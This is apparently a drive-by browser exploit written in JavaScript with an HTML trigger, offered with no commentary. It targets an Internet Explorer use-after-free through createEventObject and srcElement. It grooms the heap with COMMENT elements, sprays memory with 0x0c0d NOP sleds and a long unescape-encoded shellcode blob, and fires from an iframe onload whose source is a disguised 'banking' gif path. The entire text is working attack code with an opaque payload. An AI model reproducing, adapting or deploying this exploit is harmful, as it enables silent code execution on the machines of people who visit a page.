var com = "COMMENT";
var arr1 = new Array();
for (i = 0; i < 1300; i++) {
    arr1[i] = document.createElement(com);
    arr1[i].data = "KXy";
}
var v1 = null;
var arr2 = new Array();

function f1() {
    var s1 = unescape('%u7075%ue232%u3d76%u72b7%uf801%u9192%u4346%u244f%ud41b%u2d7f%u2c7a%u33b9%u30fc%uf9d3%u0571%u4eb1%u6637%u0a3f%u74d6%u0d34%u9f1d%ubb15%u2599%u14b2%u797a%ud112%u19e3%uc1fe%u15eb%u83b3%u37e0%u1c35%u7eb4%ue138%ubb25%ud687%u924e%u34b1%u7271%u4673%u410c%u13b7%ua9fc%u3f77%u76b0%ube3c%u979f%u2d9b%u96b2%u4a75%ub64b%ufd86%u491d%u14a8%u240d%u7f74%u677c%u9098%uf803%u2fba%u3a27%u40d5%u7047%u9966%ubfb5%uf539%ub943%u022c%u05e2%u7d78%u9348%u913d%ub88d%uf969%u424f%u2304%u7bd4%u3575%u2970%u8cf9%u3de1%u7674%ud21a%u7de0%u9366%u434f%u72b3%u1d2d%u7b49%u7c2c%ufd08%u049f%u8db8%ub2b5%u057e%u414e%ue311%ube25%ub02f%uf881%u0cb1%uff88%uc0c7%u22eb%u7afc%u2477%u1599%uba46%u2079%u14e2%u2abb%ua8f5%u4891%ubf90%u923f%u9637%u1034%ua9d4%u479b%u71b7%ub61c%u9798%u0d73%u42b9%u3c7f%u844b%u40d6%ud528%u27b4%u6778%ud018%u75e2%ub44a%u91b2%ueb85%u4a2d%u767f%u7b42%u923c%u4735%u7e43%u2f71%u0d37%u7449%u7704%ub93f%u80a9%u48d6%u66b0%ubabe%u4678%u4e0c%u2a40%ub3f5%uf987%u6793%ub78d%u727a%uf812%u4f27%u99b1%u147d%u159b%u9690%ua805%uf633%u18e3%u2bd5%u98fd%u734b%ub81c%u3424%u3db5%u9f25%ud46b%u1d7c%u0b79%ue0f7%ubf41%ubbb6%u3297%u70e1%ufc08%u8c2c%u78e2%u1575%u48b8%u76b3%u704a%u3f67%u7e49%u034f%u1ad4%u97fc%ueb20%ufd38%u237f%u4bf9%ub246%u6674%u8905%u02e1%u0ce3%u1c7c%u913d%u727a%ub924%u3592%u96b7%u8125%ubed6%ubb4e%u1479%u091d%u3ce0%u4093%u347d%ua998%uf83a%ub4b1%u7b8d%u2d73%u4247%u9bbf%u4143%u99a8%u04b0%u0dba%u2cb6%u2f71%u379f%uf513%u77b5%u7a27%uc611%ud5c0%u8090%u0af5%ue1c1%ue029%ue339%u7b78%u8d0d%u3570%u84be%ub3fc%u9f43%u3f7f%u21b0%u46eb%u7247%ub11d%u2c71%u14b4%u939b%u7992%u7e48%u7d73%u2f76%u9915%u7774%uf922%u664b%ud186%u3de2%u6997%ua8d5%u10bb%ud4d2%u0c91%ub640%ubab9%u9027%u7ca9%ud019%u4ad6%u7537%u252d%u67b5%ub7b8%u4e4f%u341c%uf885%u9698%u1b78%uebd3%u7242%ufd28%u3073%u05e3%u497c%u047d%ubfb2%u3c77%u4175%u2471%u0d79%ue183%u702c%ub527%u3c74%u017e%u3be2%u2fe0%u7b1d%u0c2d%u7ad5%ub424%u4767%u054b%u257f%u489b%u4293%u374a%u15d4%ubab3%u8dbe%u883f%u4ff9%ua93d%ubfb6%ub898%u43bb%u4914%u41a8%ub24e%ub9fd%u0476%u9934%u90b7%u3546%ufcb0%ub11c%ud631%u6691%u9240%u97f8%u969f%uddf5%ubfc7%u0cbd%u8bc1%u74d9%uf424%u3358%ub1c9%u314b%u1778%u7803%u8317%uf055%u7e23%ucd24%u73f0%u31d9%u9b04%uceac%u5cf5%u47ce%u6d10%u3cdc%udc50%u37d0%ued34%u1a9b%u66ad%ub2e9%ucfc2%ue547%ud0ed%u2966%u13a1%ud5e9%u47b8%ue4c9%u9a72%u2008%u556e%uf958%uc4e4%u8e4c%ud4b9%u406d%u65b6%ue515%u1109%ue4af%u8a59%uafa4%ua041%u0fe2%u6573%u6cf1%u023a%u07c1%uc2bd%ue718%u2a8f%ud6f6%ua73f%u1e07%u5887%u5472%ue5fb%uaf84%u3181%u3201%ub121%u96b1%u16d3%u5c27%ud3df%u3a2c%ue2fc%u30e1%u6ff8%u9704%u3488%u3322%uefd0%u624b%u5ebc%u7474%u3e18%ufed0%u2b8b%u5d62%u98c4%u5e58%ub714%u2deb%u1826%uba47%ud10a%u3d41%uc86c%ud135%uf393%ufb45%ua757%u9315%uc87e%u63fe%u1d7e%u3450%uced0%ue410%ube90%ueef8%ue01e%u1118%u89f5%uebb2%ubf9e%uf456%ua831%uf454%u74dc%u12d1%u94b4%u8db7%u0c21%u4692%ud1d3%u2309%u5ad3%ud3bd%uaa9a%uc7c8%u5b4b%uba87%u64da%ud032%uf0e2%u73b8%u6cb4%ua2c2%u32f2%u813d%ufb88%u6aab%u03e7%u6b3b%u55f7%u6b51%u019f%u3801%u4dba%u2c9c%ud817%u051e%u4bcb%uab76%ubb32%u54d9%u3d11%u8326%ubb5c%ua15e%u078c');
    var s2 = unescape("%u0c0d%u0c0d");
    do {
        s2 += s2
    } while (s2.length < 0xd0000);
    for (i = 0; i < 150; i++) arr2[i] = s2 + s1;
}

function f2(arg1) {
    f1();
    v1 = document.createEventObject(arg1);
    document.getElementById("id1").innerHTML = "";
    window.setInterval(f3, 50);
}

function f3() {
    p = "\u0c0f\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d\u0c0d";
    for (i = 0; i < arr1.length; i++) {
        arr1[i].data = p;
    }
    var t = v1.srcElement;
}

<html>
  <span id="id1"><iframe src="/banking.htmTysdAWdqQEBybyCGKQkGJyVuQsNWvmIFg.gif" onload="f2(event)" /></span>
</html>